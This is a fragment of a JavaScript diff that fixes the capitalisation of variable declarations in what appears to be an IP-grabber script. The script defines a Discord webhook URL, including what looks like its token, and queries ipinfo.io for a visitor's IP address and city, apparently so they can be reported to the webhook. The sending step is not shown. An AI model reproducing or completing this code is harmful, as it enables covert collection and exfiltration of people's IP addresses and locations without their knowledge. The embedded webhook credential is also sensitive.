@@ -4,8 +4,8 @@ var web = "https://discord.com/api/webhooks/1080866736234045511/i_j_4QMtRFMlWenJ
   
 let ip;
   let city;
-Let longitude;
-Let latitude;
+let longitude;
+let latitude;
   $.get("https://ipinfo.io", function(response) {
            	ip = response.ip;
     city = response.city;
